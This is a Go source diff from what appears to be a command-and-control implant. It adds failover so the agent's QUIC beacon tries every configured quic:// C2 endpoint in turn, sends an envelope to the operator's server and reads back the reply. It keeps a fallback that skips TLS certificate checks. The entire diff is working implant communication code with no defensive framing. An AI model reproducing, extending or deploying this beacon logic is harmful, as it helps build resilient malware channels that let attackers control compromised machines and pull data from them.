@@ -16,17 +16,15 @@ import (
 const quicMaxBeacon = 16 * 1024 * 1024
 
 // sendQUICBeacon ships one v2 envelope over a QUIC stream (TLS 1.3).
-// The C2 URL is quic://host:port. The write side is closed after the
-// request so the server can ReadAll; the response is read until EOF.
+// The C2 URL is quic://host:port, and every configured quic:// endpoint is
+// tried in failover order.
 func sendQUICBeacon(body []byte) []byte {
-	raw, scheme, ok := currentC2Dial()
-	if !ok || (scheme != "" && scheme != "quic") {
-		if Debug {
-			fmt.Printf("[!] QUIC beacon: no quic:// endpoint configured (scheme=%s)\n", scheme)
-		}
-		return nil
-	}
+	return forEachC2Endpoint("quic", func(_ int, _ string, hostPort, _ string) []byte {
+		return sendQUICBeaconAt(hostPort, body)
+	})
+}
 
+func sendQUICBeaconAt(hostPort string, body []byte) []byte {
 	tlsCfg := newAgentTLSConfig("")
 	if tlsCfg == nil {
 		tlsCfg = &tls.Config{InsecureSkipVerify: SkipTLSVerify}
@@ -38,13 +36,13 @@ func sendQUICBeacon(body []byte) []byte {
 	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
 	defer cancel()
 
-	conn, err := quic.DialAddr(ctx, raw, tlsCfg, &quic.Config{
+	conn, err := quic.DialAddr(ctx, hostPort, tlsCfg, &quic.Config{
 		MaxIdleTimeout:  25 * time.Second,
 		KeepAlivePeriod: 10 * time.Second,
 	})
 	if err != nil {
 		if Debug {
-			fmt.Printf("[!] QUIC beacon: dial %s failed: %v\n", raw, err)
+			fmt.Printf("[!] QUIC beacon: dial %s failed: %v\n", hostPort, err)
 		}
 		return nil
 	}
